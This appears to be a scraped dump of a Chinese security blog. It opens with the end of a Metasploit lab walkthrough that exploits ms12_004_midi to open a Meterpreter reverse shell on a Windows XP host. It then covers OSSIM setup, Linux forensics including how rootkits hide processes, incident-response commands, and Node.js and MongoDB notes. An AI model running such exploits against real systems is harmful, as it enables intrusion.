an address on the local machine or 0.0.0.0 SRVPORT 8080 yes The local port to listen on. SSL false no Negotiate SSL for incoming connections SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH no The URI to use for this exploit (default is random)Exploit target: Id Name -- ---- 0 Automaticmsf exploit(ms12_004_midi) &gt; set SRVHOST 192.168.1.8SRVHOST =&gt; 192.168.1.8msf exploit(ms12_004_midi) &gt; set URIPATH /URIPATH =&gt; /msf exploit(ms12_004_midi) &gt; set LPORT 1234LPORT =&gt; 1234msf exploit(ms12_004_midi) &gt; exploit[*] Exploit running as background job.[*] Started reverse TCP handler on 192.168.1.8:1234[*] Using URL: http://192.168.1.8:8080/[*] Server started. 使用目标主机IE浏览器打开URL后控制台输出为1234567891011*] 192.168.1.43 ms12_004_midi - Request as: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)[*] 192.168.1.43 ms12_004_midi - Sending html to 192.168.1.43:2933...[*] 192.168.1.43 ms12_004_midi - Request as: Windows-Media-Player/9.00.00.4503[*] 192.168.1.43 ms12_004_midi - Sending midi corruption file...[*] Sending stage (957487 bytes) to 192.168.1.43[*] Meterpreter session 2 opened (192.168.1.8:1234 -&gt; 192.168.1.43:2934) at 2016-06-04 16:38:01 +0800[*] Session ID 2 (192.168.1.8:1234 -&gt; 192.168.1.43:2934) processing InitialAutoRunScript 'migrate -f'[*] Current server process: iexplore.exe (372)[*] Spawning notepad.exe process to migrate to[+] Migrating to 3948[+] Successfully migrated to process 查看和使用session1234567891011121314151617181920212223242526272829303132333435363738sf exploit(ms12_004_midi) &gt; sessionsActive sessions=============== Id Type Information Connection -- ---- ----------- ---------- 1 meterpreter x86/win32 DH-CA8822AB9589\\Administrator @ DH-CA8822AB9589 192.168.1.8:1234 -&gt; 192.168.1.43:2927 (192.168.1.43) 2 meterpreter x86/win32 DH-CA8822AB9589\\Administrator @ DH-CA8822AB9589 192.168.1.8:1234 -&gt; 192.168.1.43:2934 (192.168.1.43)msf exploit(ms12_004_midi) &gt; sessions -i 1[*] Starting interaction with 1...meterpreter &gt; ifconfigInterface 1============Name : MS TCP Loopback interfaceHardware MAC : 00:00:00:00:00:00MTU : 1520IPv4 Address : 127.0.0.1Interface 2============Name : AMD PCNET Family PCI Ethernet Adapter - Packet Scheduler MiniportHardware MAC : 00:0c:29:84:07:87MTU : 1500IPv4 Address : 192.168.1.43IPv4 Netmask : 255.255.255.0meterpreter &gt; shellProcess 204 created.Channel 1 created.Microsoft Windows XP [Version 5.1.2600](C) Copyright 1985-2001 Microsoft Corp.C:\\Documents and Settings\\Administrator\\Desktop&gt;","tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"http://yoursite.com/tags/Metasploit/"}]},{"title":"OSSIM-新建邮件提醒","date":"2016-07-27T11:53:27.000Z","path":"sec/OSSIM-新建邮件提醒/","text":"修改OSSIM ossim_setup.conf文件 相关操作见 https://www.alienvault.com/forums/discussion/925/ossim-4-email-notification 123456789101 - Edit the file /etc/ossim/ossim_setup.conf the editor they like.2 - Change the following parameters:email_notify=user@company.commailserver_relay=xxx.xxx.xxx.xxx3 - Save the changes and exit the editor.4 - run ossim-reconfig5 - Send a test mail:echo \"text\" | mail -s \"Subject\" user@domain.com6 - Check the mail delivery system is functioning properly:tail -f /var/log/mail.log 临时申请了个邮箱把信息填写如下： OSSIM Web端相关设置创建发生邮件的操作 相关设置见 https://www.alienvault.com/documentation/usm-v5/policy-management/create-action-send-email.htm 123From Configuration &gt; Threat Intelligence, click the ACTIONS tab.Click New. 设置好名称、描述、发件邮箱、收件人、邮件主题和邮件内容，TYPE必须选择为Send an email message如下图所示 创建触发发送邮件的条件操作步骤 https://www.alienvault.com/documentation/usm-v5/policy-management/create-ext-pol-trigger-email.htm 效果图","tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"},{"name":"OSSIM","slug":"OSSIM","permalink":"http://yoursite.com/tags/OSSIM/"}]},{"title":"OSSIM-Add-Linux-Agent","date":"2016-07-21T14:01:40.000Z","path":"sec/OSSIM-Add-Linux-Agent/","text":"OSSIM 添加 Linux代理 Env CentOS6.6 操作方法见 官网干净的CentOS需要 先安装好wget 和gcc 下载源码安装1234 wget https://bintray.com/artifact/download/ossec/ossec-hids/ossec-hids-2.8.3.tar.gztar -zxvf ossec-hids-2.8.3.tar.gzcd ossec-hids-2.8.3bash install.sh 然后就是根据提示进行安装， 提取Key到agent文件(/var/ossec/binmanage_agents) 选择语言 提示安装gcc 选择安装模式 agent4.相关信息设置默认就好5.根据相关情况填入Service IP或者主机名……安装成功后会给出服务启动和关闭的一些命令信息123456789- 已正确完成系统配置.- 要启动 OSSEC HIDS: /var/ossec/bin/ossec-control start- 要停止 OSSEC HIDS: /var/ossec/bin/ossec-control stop- 要查看或修改系统配置,请编辑 /var/ossec/etc/ossec.conf 在OSSIM Web 端添加Agent Environment &gt; Detection&gt;HIDS &gt; Agents &gt; Agent Control &gt; Add Agent.选择相应主机后 Save 提取Key到agent文件(/var/ossec/binmanage_agents) agent启动成功 ) 然后可在OSSIM中看到该Agent相关信息","tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"},{"name":"OSSIM","slug":"OSSIM","permalink":"http://yoursite.com/tags/OSSIM/"}]},{"title":"OSSIM-GNOME-GUIDE","date":"2016-07-20T11:57:59.000Z","path":"sec/OSSIM-GNOME-GUIDE/","text":"修改源列表 由于Gnome较大，所以使用国内源，放在文件最前面 1vim /etc/apt/sources.list 123456deb http://mirrors.ustc.edu.cn/debian jessie main contrib non-freedeb-src http://mirrors.ustc.edu.cn/debian jessie main contrib non-freedeb http://mirrors.ustc.edu.cn/debian jessie-proposed-updates main contrib non-freedeb-src http://mirrors.ustc.edu.cn/debian jessie-proposed-updates main contrib non-freedeb http://mirrors.ustc.edu.cn/debian jessie-updates main contrib non-freedeb-src http://mirrors.ustc.edu.cn/debian jessie-updates main contrib non-free 更新系统1apt-get update 安装Gnome环境12apt-get install gnomeapt-get install xserver-xorg 安装FVWM环境1apt-get install x-window-system-core fvwm 解决单列用户模式 vim /boot/grub/grub.cfg1修改 set timeout=0,值为5~10之间都OK 允许Root用户登录 进入/etc/pam.d/gdm3目录 找到相应文件 注释掉如下两行12./gdm-autologin:3:auth required pam_succeed_if.so user != root quiet_success./gdm-password:3:auth required pam_succeed_if.so user != root quiet_success 启动图形界面123init 2service gdm3 restartservice gdm3 start 删除相应deb文件 由于Gnome相关文件较大，安装结束后为了节省磁盘空间我们删除相关deb文件1rm /var/cache/apt/archives/*.deb tips 磁盘空间实际环境500GB 到2T相关版本changeloghttps://www.alienvault.com/forums/discussion/7242/ 汉化 李晨光-51CTO博客","tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"},{"name":"OSSIM","slug":"OSSIM","permalink":"http://yoursite.com/tags/OSSIM/"}]},{"title":"Linux取证分析","date":"2016-06-26T13:26:12.000Z","path":"sec/Linux取证分析/","text":"进程隐藏相关原理原理 目前在 Linux 上隐藏进程的技术主要有两种 1( 1) 类似于 ps、top 等的命令能够列出包括 init 在内的所有重要的系统进程, 通过对他们的实现过程进行改造来实现进程隐藏, 具体做法是“劫持”ps 的关键系统调用 sys_getdents( ), 从而无法查看包含进程信息的目录。 1( 2) ps 命令实际是通过读取 proc文件系统来向用户返回进程信息的, 而 proc 文件系统是通过文件系统( VFS) 接口来实现的, 因此通过劫持文件系统操作函数集( inode_operation 和 file_operations) 中的有关函数, 使得进程信息无法通过文件系统接口输出给用户。 以上两种方法虽然都可实现进程隐藏, 但均是在较高的层次上实现的,方法 1 虽然在 ps 时看似隐藏了某个进程, 但在 proc中该进程仍然对用户可见 方法 2 是在 VFS 层对内核函数的劫持, 意味着需要先判断输出的系统信息是与进程有关的还是与进程无关的( 与进程无关的并无隐藏的必要)并且这两种方法都无法满足仅对进程部分信息隐藏的需求, 在实际应用中不够灵活。实际上, 用户对进程信息的访问, 都是通过proc 文件系统完成的, 因此, 实现进程隐藏的根本途径是从 proc 入手, 准确地找出进程信息产生的关键点, 在这些关键点上做一些特殊的处理, 从而达到实现进程隐藏的目的。 Proc文件系统简介1proc 文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。用户和应用程序可以通过 proc 得到系统的信息，并可以改变内核的某些参数。由于系统的信息，如进程，是动态改变的，所以用户或应用程序读取 proc 文件时，proc 文件系统是动态从系统内核读出所需信息并提交的。 1基于/proc 文件系统如上所述的特殊性，其内的文件也常被称作虚拟文件，并具有一些独特的特点。例如，其中有些文件虽然使用查看命令查看时会返回大量信息，但文件本身的大小却会显示为 0 字节。此外，这些特殊文件中大多数文件的时间及日期属性通常为当前系统时间和日期，这跟它们随时会被刷新（存储于 RAM 中）有关。 1为了查看及使用上的方便，这些文件通常会按照相关性进行分类存储于不同的目录甚至子目录中，如/proc/scsi 目录中存储的就是当前系统上所有 SCSI 设备的相关信息，/proc/N 中存储的则是系统当前正在运行的进程的相关信息，其中 N 为正在运行的进程（可以想象得到，在某进程结束后其相关目录则会消失）。 1大多数虚拟文件可以使用文件查看命令如 cat、more 或者 less 进行查看，有些文件信息表述的内容可以一目了然，但也有文件的信息却不怎么具有可读性。不过，这些可读性较差的文件在使用一些命令如 apm、free、lspci 或 top 查看时却可以有着不错的表现。 Proc文件系统目录结构 目录名称 目录内容 apm 高级电源管理信息 cmdline 内核命令行 Cpuinfo 关于 Cpu 信息 Devices 可以用到的设备（块设备/字符设备） Dma Used DMS channels Filesystems 支持的文件系统 Interrupts 中断的使用 Ioports I/O 端口的使用 Kcore 内核核心印象 Kmsg 内核消息 Ksyms 内核符号表 Loadavg 负载均衡 Locks 内核锁 Meminfo 内存信息 Misc Miscellaneous Modules 加载模块列表 Mounts 加载的文件系统 Partitions 系统识别的分区表 Rtc Real time clock Slabinfo Slab pool info Stat 全面统计状态表 s Swaps 对换空间的利用情况 Version 内核版本 Uptime 系统正常运行时间 进程信息的创建过程 结合实际情况, 一个用户查看某个进程的信息有两种情形 123( 1) 用 cat 之类的命令直接读取进程目录下的节点文件( 2) 用 ls 之类的命令列举所有的进程目录proc 对于这两种方式分别有不同的处理对于 ls 命令是调用 VFS 的 readdir( ) , 而对于cat 命令则会发生对一系列 lookup 函数的调用。 进程隐藏的实现 通过以上对 proc 文件系统中生成进程信息实现过程的分析, 我们发现由于 Linux 缺乏模块化,难以找到一个统一的入口, 准确地对进程信息实现隐藏, 必须对实际应用中可能出现的情形 用 cat之类的命令直接读取进程目录下的节点文件和用 ls之类的命令列举所有的进程目录, 分别加以考虑。1对函数 proc_pid_lookup 进行修改: 在步骤a 的末尾添加代码, 用于判断该进程号是否为隐藏进程的进程号, 如果是, 则跳转到我们定制的一个函数, 该函数可打印出? 该进程无法查看?之类的调试信息后返回上层调用者; 如果否, 则照常执行步骤b、c 1对函数 proc_pid_readdir 进行修改: 在步骤b 中, 当获取一个进程后, 先判断该进程是否为隐藏进程, 如果是则跳转到我们定制的一个函数, 打印出? 该进程无法查看?之类的调试信息后返回上层调用者; 如果否, 则照常执行步骤 b、c。对于进程部分信息的隐藏, 通过文章第 2 部分的分析, 实际上是选择数组 tgid_base_stuff 中哪些节点不被创建的问题, 对它的实现也要包括以下两部分: 1( 1) 对函数 proc_pident_lookup 进行修改: 在步骤 a 开始前添加代码, 用于判断要创建的节点是否为需隐藏的节点, 如果是, 则跳转到我们定制的一个函数, 打印出? 该节点无法查看?之类的调试信息后返回上层调用者; 如果否, 则照常执行步骤 b。 1( 2) 对函数 proc_pident_readdir 进行修改: 在步骤 a 的末尾添加代码, 用于判断要创建的节点是否为需隐藏的节点, 如果是, 则跳转到我们定制的一个函数, 打印出? 该节点无法查看?之类的调试信息后转到步骤 c; 如果否, 则照常执行步骤 b、c。 结论1进程隐藏是实现进程保护的一种简单可行的方法之一, 虽然可以在从 proc 到 vfs 的各个层次上容易实现对某个进程的隐藏, 但是如果需要对进程部分信息灵活地进行隐藏, 必须在 proc 层准确地找出进程目录以及其下节点生成的关键点, 在这些关键点上来实现进程隐藏。由于 Linux 缺乏模块化的缺点, 在列举目录和查看节点文件时没有统一的入口点, 而这两种对进程信息的访问都会涉及到进程信的生成, 因此, 需要在内核中对每个进程目录或节点文件生成的地方一一做处理。本方法在内核级上分别实现了对进程全部信息以及进程部分信息的隐藏, 如能根据实际需求, 结合一定的隐藏策略, 比如指定某个系统中哪些进程应该被隐藏, 则在实际应用中更具价值。 网络异常排查方法Windows排查 查看目前的网络连接情况，定位可疑网络连接（结合业务访问排查）1netstat -b -n (管理员权限) 通过网络连接进一步确认可疑连接的PID 1netstat -ano 根据PID确定是那个进程 1tasklist | findstr xxx 确定此进程的用途以及可否杀死 1taskkill /T /F /PID 3036 其他 1若以上几步没有解决，使用PC Hunter（基于XueTr源码重新开发）工具对其进行深度排查 Linux排查 确定系统自身的命令是否被恶意替换，如ls、netstat 1使用chkrootkit、rkhunter类工具检查下是否存在恶意程序及恶意替换 查看linux自身的网络连接，并定位可疑程序的PID 1netstat -antpl 根据pid查找执行文件的及其路径 1lsof -p PID 进一步排查 12cd /proc/pidnumberls -ail 杀掉对应恶意程序或进程 121 可将/proc/pidnumber 下的恶意程序直接rm –rf2 根据进程号直接杀死进程 kill -9 pidnumber 其他一些可能用到的命令 12341 分析access.log获得访问前10位的ip地址awk &apos;&#123;print $1&#125;&apos; access.log |sort|uniq -c|sort -nr|head -102 查看连接某服务端口最多的的IP地址netstat -nat | grep &quot;192.168.1.15:1234&quot; |awk &apos;&#123;print $5&#125;&apos;|awk -F: &apos;&#123;print $1&#125;&apos;|sort|uniq -c|sort -nr|head -20 tips一些框架(工具)内存取证工具 Volatility Github介绍：http://www.freebuf.com/articles/system/26763.html 获取木马配置文件通过python脚本来获取木马中的配置文件，诸如ftp、ssh等信息，反向对黑客进行攻击。目前支持Adwind、Adzok、Albertino Advanced RAT等40多个木马。RATDecoders Github 远程现场取证的事件应急响应框架一个被安装在目标系统的Python 代理客户端，可以对Python基础设施进行管理和交流。GRR Rapid Response Github 隐藏进程检测工具Linux Rootkit (vfs hook) 是一个linux内核模块，是用于检测rootkit的一个小demo。通过读取此内核模块创建的虚拟文件，可检测通过Hook vfs 函数来隐藏的进程。大家可把他作为一个单一的检测工具，也可以集成到诸如OSSEC等HIDS里，通过周期性任务触发来检测并上报可疑事件。 使用方法：12照例就是解压之后 编译加载就好。unzip process_list.zip;cd process_list;make;make install 相关命令系统：123456789uname -a 查看内核/操作系统/CPU信息cat /etc/issuecat /etc/redhat-release 查看操作系统版本cat /proc/cpuinfo 查看CPU信息hostname 查看计算机名lspci -tv 列出所有PCI设备lsusb -tv 列出所有USB设备lsmod 列出加载的内核模块env 查看环境变量 资源：1234567free -m 查看内存使用量和交换区使用量df -h 查看各分区使用情况du -sh &lt;目录名&gt; 查看指定目录的大小grep MemTotal /proc/meminfo 查看内存总量grep MemFree /proc/meminfo 查看空闲内存量uptime 查看系统运行时间、用户数、负载cat /proc/loadavg 查看系统负载 磁盘和分区：12345mount | column -t 查看挂接的分区状态fdisk -l 查看所有分区swapon -s 查看所有交换分区hdparm -i /dev/hda 查看磁盘参数(仅适用于IDE设备)dmesg | grep IDE 查看启动时IDE设备检测状况 网络：123456ifconfig 查看所有网络接口的属性iptables -L 查看防火墙设置route -n 查看路由表netstat -lntp 查看所有监听端口netstat -antp 查看所有已经建立的连接netstat -s 查看网络统计信息 进程：12ps -ef 查看所有进程top 实时显示进程状态（另一篇文章里面有详细的介绍） ps命令可以列出正在运行的进程。以下命令可以列出当前系统上所有正在运行的进程：1ps -A 这个命令列出的信息也许太多，不便于查看。你可以使用less命令通过一个管道输出，分页查看：1ps -A | less 你也可以使用grep来对来做管道输出，查找出某个进程。例如，查找Firefox进程：1ps -A | grep firefox 以树形显示进程1pstree命令同样可以显示进程信息，不过它是以树形式显示进程。 pgrep给定一个搜索关键词，pgrep命令会返回所有匹配这个关键词的进程ID。12 pgrep iceweasel 2074 也可以将这个命令与kill命令结合起来干掉一个特定的进程12➜ ~ kill $(pgrep iceweasel)➜ ~ 或者使用 12➜ ~ pkill iceweasel➜ ~ 用户：123456w 查看活动用户id &lt;用户名&gt; 查看指定用户信息last 查看用户登录日志cut -d: -f1 /etc/passwd 查看系统所有用户cut -d: -f1 /etc/group 查看系统所有组crontab -l 查看当前用户的计划任务 服务：12chkconfig –list 列出所有系统服务chkconfig –list | grep on 列出所有启动的系统服务 程序：1rpm -qa 查看所有安装的软件包 相关文章 Linux入侵取证：从一次应急事件讲起 Linux下基于内存分析的Rootkit检测方法 如何分析 Linux 日志","tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"}]},{"title":"Node.js学习笔记","date":"2016-06-03T14:00:33.000Z","path":"others/Node-js学习笔记/","text":"新建http服务1234567891011var http = require('http');http.createServer(function (request, response) &#123; response.writeHead(200, &#123;'Content-Type': 'text/html; charset=utf-8'&#125;); if(request.url!==\"/favicon.ico\")&#123; console.log('访问'); response.write('hello,world'); response.end(\"response.end\"); &#125;&#125;).listen(8000);console.log(\"Server running at http://127.0.0.1:8000/\"); 使用function 目录结构 tp@V:/mnt/d/Node.js$ tree.├── hello.js├── models│ └── otherfuns.js└── n2_funcall.jsn2_funcall.js 12345678910111213var http = require('http');var otherfun = require(\"./models/otherfuns.js\");http.createServer(function (request, response)&#123; response.writeHead(200, &#123;'Content-Type': 'text/html; charset=utf-8'&#125;); if(request.url!==\"/favicon.ico\")&#123; otherfun['fun3'](response); otherfun['fun2'](response);//也可以用otherfun.fun2(response) response.end(\"response.end\"); &#125;&#125;).listen(8000);console.log(\"Server running at http://127.0.0.1:8000/\"); otherfuns.js 12345678910module.exports=&#123; fun2:function(res)&#123; console.log(\"我是fun2\"); res.write(\"Hello, I am fun2\"); &#125;, fun3:function(res)&#123; console.log(\"I am fun3\"); res.write(\"Hello, I am fun3\"); &#125;&#125; 效果 使用模块 models/User.js 123456789function User(id, name, age)&#123; this.id=id; this.name=name; this.age=age; this.enter=function()&#123; console.log(this.name+\"进入图书馆\"); &#125;&#125;module.exports = User; models/Teacher.js1234567891011var User = require('./User');function Teacher(id,name,age)&#123; User.apply(this,[id,name,age]); this.teach=function(res)&#123; res.write(this.name+\"讲课\"); &#125;&#125;module.exports = Teacher;```JavaScript&gt;n3_modelcall.js var http = require(‘http’); // var User = require(“./models/User”);var Teacher = require(“./models/Teacher”) http.createServer(function (request, response){ response.writeHead(200, {‘Content-Type’: ‘text/html; charset=utf-8’}); if(request.url!==”/favicon.ico”){ //funname = ‘fun3’; teacher = new Teacher(1,’我来’,18); // user.id =1; // user.name=’我来’; // user.age=18; teacher.enter(); teacher.teach(response); response.end(“response.end”); } }).listen(8000);console.log(“Server running at http://127.0.0.1:8000/“);1234567891011121314![](https://ww2.sinaimg.cn/large/006tNc79gy1fdtdb7fgu8j30b8058gln.jpg)# 使用路由&gt;models/route.js```JavaScriptmodule.exports=&#123; login:function(req, res)&#123; res.write(&quot;I am login module.&quot;); &#125;, admin:function(req, res)&#123; res.write(&quot;I am admin module.&quot;); &#125;&#125; n4_rout.js1234567891011121314151617var http = require('http');var url = require('url');var router = require('./models/route');http.createServer(function (request, response)&#123; response.writeHead(200, &#123;'Content-Type': 'text/html; charset=utf-8'&#125;); if(request.url!==\"/favicon.ico\")&#123; var pathname = url.parse(request.url).pathname; pathname = pathname.replace(/\\//, ''); console.log(pathname); router[pathname](request, response); response.end(\"response.end\"); &#125;&#125;).listen(8000);console.log(\"Server running at http://127.0.0.1:8000/\"); 读文件 models/route.js 1234567891011121314151617var optfile = require('./optfile');module.exports=&#123; login:function(req, res)&#123; function recall(data)&#123; res.write(data); res.end(\" \"); &#125; optfile.readfile('./views/login.html', recall); &#125;, admin:function(req, res)&#123; function recall(data)&#123; res.write(data); res.end(\" \"); &#125; optfile.readfile('./views/admin.html', recall); &#125;&#125; models/optfile.js1234567891011121314151617181920var fs = require('fs');module.exports = &#123; readfileSync:function(path)&#123;//同步读取 var data = fs.readFileSync(path, 'utf-8'); console.log(data); console.log('同步方法执行完毕'); &#125;, readfile:function(path, recall)&#123;//异步读取 fs.readFile(path, function(err, data)&#123; if(err)&#123; console.log(err); &#125;else&#123; console.log(data.toString()); recall(data); &#125; &#125;); console.log('异步方法执行完毕');&#125;&#125; n5_readfile.js123456789101112131415161718var http = require('http');var url = require('url');var router = require('./models/route');//var optfile = require('./models/optfile');http.createServer(function (request, response)&#123; response.writeHead(200, &#123;'Content-Type': 'text/html; charset=utf-8'&#125;); if(request.url!==\"/favicon.ico\")&#123; var pathname = url.parse(request.url).pathname; pathname = pathname.replace(/\\//, ''); console.log(pathname); router[pathname](request, response); &#125;&#125;).listen(8000);console.log(\"Server running at http://127.0.0.1:8000/\"); views/login.html1This is login page. views/admin.html1This is admin page. 写文件 models/optfile.js1234567891011121314151617var fs = require('fs');module.exports = &#123; writefile:function(path, data, recall)&#123;//异步方式 fs.writeFile(path, data, function (err)&#123; if (err)&#123; throw err; &#125; console.log('It\\'s Saved!');//文件被保存 recall(\"write file success.\"); &#125;); &#125;, writeFileSync:function(path, data)&#123;//同步方式 fs.writeFileSync(path, data); console.log(\"同步写文件完成\"); &#125;&#125; models/route.js123456789101112131415161718192021222324var optfile = require('./optfile');module.exports=&#123; login:function(req, res)&#123; function recall(data)&#123; res.write(data); res.end(\" \"); &#125; optfile.readfile('./views/login.html', recall); &#125;, admin:function(req, res)&#123; function recall(data)&#123; res.write(data); res.end(\" \"); &#125; optfile.readfile('./views/admin.html', recall); &#125;, writefile:function(req, res)&#123; function recall(data)&#123; res.write(data); res.end(\" \"); &#125; optfile.writefile('./views/test.txt', 'write file ok1.', recall); &#125;&#125; n6_writefile.js123456789101112131415161718var http = require('http');var url = require('url');var router = require('./models/route');//var optfile = require('./models/optfile');http.createServer(function (request, response)&#123; response.writeHead(200, &#123;'Content-Type': 'text/html; charset=utf-8'&#125;); if(request.url!==\"/favicon.ico\")&#123; var pathname = url.parse(request.url).pathname; pathname = pathname.replace(/\\//, ''); console.log(pathname); router[pathname](request, response); &#125;&#125;).listen(8000);console.log(\"Server running at http://127.0.0.1:8000/\"); 读取图片 models/optfile.js仅能显示图片12345678910111213141516var fs = require('fs');module.exports = &#123; readImg:function(path, res)&#123; fs.readFile(path, 'binary', function(err, file)&#123; if (err)&#123; console.log(err); return; &#125;else&#123; console.log('输出文件'); res.write(file, 'binary'); res.end(); &#125; &#125;); &#125;&#125; n7_readimg.js1234567891011121314var http = require('http');var optfile = require('./models/optfile');http.createServer(function (request, response)&#123; response.writeHead(200, &#123;'Content-Type': 'image/jpeg'&#125;); if(request.url!==\"/favicon.ico\")&#123; console.log('访问'); optfile.readImg('./images/1.png', response); console.log(\"move on\"); &#125;&#125;).listen(8000);console.log(\"Server running at http://127.0.0.1:8000/\"); 路由改造 models/optfile.js可显示文本和图片12345678910111213141516171819202122232425262728293031323334353637383940var fs = require('fs');module.exports = &#123; writefile:function(path, data, recall)&#123;//异步方式 fs.writeFile(path, data, function (err)&#123; if (err)&#123; throw err; &#125; console.log('It\\'s Saved!');//文件被保存 recall(\"write file success.\"); &#125;); &#125;, writeFileSync:function(path, data)&#123;//同步方式 fs.writeFileSync(path, data); console.log(\"同步写文件完成\"); &#125;, readImg:function(path, res)&#123; fs.readFile(path, 'binary', function(err, file)&#123; if (err)&#123; console.log(err); return; &#125;else&#123; console.log('输出文件'); res.write(file, 'binary'); res.end(); &#125; &#125;); &#125;, readfile:function(path, recall)&#123;//异步读取 fs.readFile(path, function(err, data)&#123; if(err)&#123; console.log(err); &#125;else&#123; console.log(data.toString()); recall(data); &#125; &#125;); console.log('异步方法执行完毕');&#125;,&#125; models/route.js 12345678910111213141516171819202122232425262728293031323334var optfile = require('./optfile');function getRecall(req, res)&#123; res.writeHead(200, &#123;'Content-Type': 'text/html; charset=utf-8'&#125;); function recall(data)&#123; res.write(data); res.end(\" \"); &#125; return recall;&#125;module.exports=&#123; login:function(req, res)&#123; recall = getRecall(req, res); optfile.readfile('./views/login.html', recall); &#125;, admin:function(req, res)&#123; function recall(data)&#123; res.write(data); res.end(\" \"); &#125; optfile.readfile('./views/admin.html', recall); &#125;, writefile:function(req, res)&#123; function recall(data)&#123; res.write(data); res.end(\" \"); &#125; optfile.writefile('./views/test.txt', 'write file ok1.', recall); &#125;, showimg:function(req, res)&#123; res.writeHead(200, &#123;'Content-Type': 'image/jpeg'&#125;); optfile.readImg('./images/1.png', res); &#125;&#125; n8_routhtml.js123456789101112131415var http = require('http');var url = require('url');var router = require('./models/route');http.createServer(function (request, response)&#123; if(request.url!==\"/favicon.ico\")&#123; var pathname = url.parse(request.url).pathname; pathname = pathname.replace(/\\//, ''); console.log(pathname); router[pathname](request, response); &#125;&#125;).listen(8000);console.log(\"Server running at http://127.0.0.1:8000/\");","tags":[{"name":"Node.js","slug":"Node-js","permalink":"http://yoursite.com/tags/Node-js/"}]},{"title":"MongoDB 基本操作","date":"2016-05-20T03:23:14.000Z","path":"db/MongoDB-基本操作/","text":"基本操作基本查询 以更美观的方式输出 1db.number.find().pretty() 条件查询条件操作符1234(&gt;) 大于 - $gt(&lt;) 小于 - $lt(&gt;=) 大于等于 - $gte(&lt;= ) 小于等于 - $lte 比如查询uid大于100的一些记录 1db.sedb.find(&#123;uid:&#123;$gt:100&#125;&#125;) 判断字段是否存在1234567891011查询所有存在age字段的记录db.users.find(&#123;age: &#123;$exists: true&#125;&#125;);查询所有不存在name字段的记录db.users.find(&#123;name: &#123;$exists: false&#125;&#125;);# 比如db.sedb.count(&#123;&apos;username&apos;:&quot;%&quot;,uid:&#123;$gt:100&#125;,email:&#123;$exists:false&#125;&#125;) 判断字段值是否为空1db.social.find(&#123;&apos;email&apos;:&#123;$ne:&quot;&quot;&#125;&#125;).pretty() 获取数据库的所有聚合名称12&gt; db.getCollectionNames();[ &quot;phone_number&quot;, &quot;system.indexes&quot; ] 统计数据库特定聚合所有记录数量12db.phone_number.count()16119524 获取数据库特定聚合的索引 比如获取phone_number聚合的所有索引1234567891011&gt; db.phone_number.getIndexes()[ &#123; &quot;v&quot; : 1, &quot;key&quot; : &#123; &quot;_id&quot; : 1 &#125;, &quot;name&quot; : &quot;_id_&quot;, &quot;ns&quot; : &quot;blacklist.phone_number&quot; &#125;] 添加索引 为phone_number的phone字段添加索引1234567&gt; db.phone_number.ensureIndex(&#123;&quot;phone&quot;:1&#125;)&#123; &quot;createdCollectionAutomatically&quot; : false, &quot;numIndexesBefore&quot; : 1, &quot;numIndexesAfter&quot; : 2, &quot;ok&quot; : 1&#125; 再查看索引情况验证一下12345678910111213141516171819&gt; db.phone_number.getIndexes()[ &#123; &quot;v&quot; : 1, &quot;key&quot; : &#123; &quot;_id&quot; : 1 &#125;, &quot;name&quot; : &quot;_id_&quot;, &quot;ns&quot; : &quot;blacklist.phone_number&quot; &#125;, &#123; &quot;v&quot; : 1, &quot;key&quot; : &#123; &quot;phone&quot; : 1 &#125;, &quot;name&quot; : &quot;phone_1&quot;, &quot;ns&quot; : &quot;blacklist.phone_number&quot; &#125;] 分组查询group count123456789101112131415161718192021&gt; db.phone.aggregate([&#123;$group:&#123;_id:&quot;$source&quot;, num_tutorial:&#123;$sum:1&#125;&#125;&#125;])&#123; &quot;_id&quot; : &quot;youm&quot;, &quot;num_tutorial&quot; : 449 &#125;&#123; &quot;_id&quot; : &quot;tianma168&quot;, &quot;num_tutorial&quot; : 349 &#125;&#123; &quot;_id&quot; : &quot;dingdkj&quot;, &quot;num_tutorial&quot; : 3259 &#125;&#123; &quot;_id&quot; : &quot;ypyun&quot;, &quot;num_tutorial&quot; : 10192 &#125;&#123; &quot;_id&quot; : &quot;ilezan&quot;, &quot;num_tutorial&quot; : 43685 &#125;&#123; &quot;_id&quot; : &quot;ism168&quot;, &quot;num_tutorial&quot; : 2856 &#125;&#123; &quot;_id&quot; : &quot;iyylw&quot;, &quot;num_tutorial&quot; : 16284 &#125;&#123; &quot;_id&quot; : &quot;iqiyi&quot;, &quot;num_tutorial&quot; : 1 &#125;&#123; &quot;_id&quot; : &quot;xudan123.com&quot;, &quot;num_tutorial&quot; : 74808 &#125;&#123; &quot;_id&quot; : &quot;vim6&quot;, &quot;num_tutorial&quot; : 26927 &#125;&#123; &quot;_id&quot; : &quot;yzm1&quot;, &quot;num_tutorial&quot; : 449854 &#125;&#123; &quot;_id&quot; : &quot;feiq&quot;, &quot;num_tutorial&quot; : 46670 &#125;&#123; &quot;_id&quot; : &quot;83r.com&quot;, &quot;num_tutorial&quot; : 144898 &#125;&#123; &quot;_id&quot; : &quot;maz8&quot;, &quot;num_tutorial&quot; : 81461 &#125;&#123; &quot;_id&quot; : &quot;kuaima9&quot;, &quot;num_tutorial&quot; : 138903 &#125;&#123; &quot;_id&quot; : &quot;bmyzm&quot;, &quot;num_tutorial&quot; : 6015 &#125;&#123; &quot;_id&quot; : &quot;sunvarma.com&quot;, &quot;num_tutorial&quot; : 45164 &#125;&#123; &quot;_id&quot; : &quot;ema6&quot;, &quot;num_tutorial&quot; : 54819 &#125;&#123; &quot;_id&quot; : &quot;yma0.com&quot;, &quot;num_tutorial&quot; : 417669 &#125;&#123; &quot;_id&quot; : &quot;creditease&quot;, &quot;num_tutorial&quot; : 101747 &#125; 如果需要排序的话123456789101112131415161718192021&gt; db.phone.aggregate([&#123;$group:&#123;_id:&quot;$source&quot;, count:&#123;$sum:1&#125;&#125;&#125;,&#123;$sort:&#123;&quot;count&quot;:-1&#125;&#125;])&#123; &quot;_id&quot; : &quot;other&quot;, &quot;count&quot; : 6133225 &#125;&#123; &quot;_id&quot; : &quot;ly.com&quot;, &quot;count&quot; : 5235378 &#125;&#123; 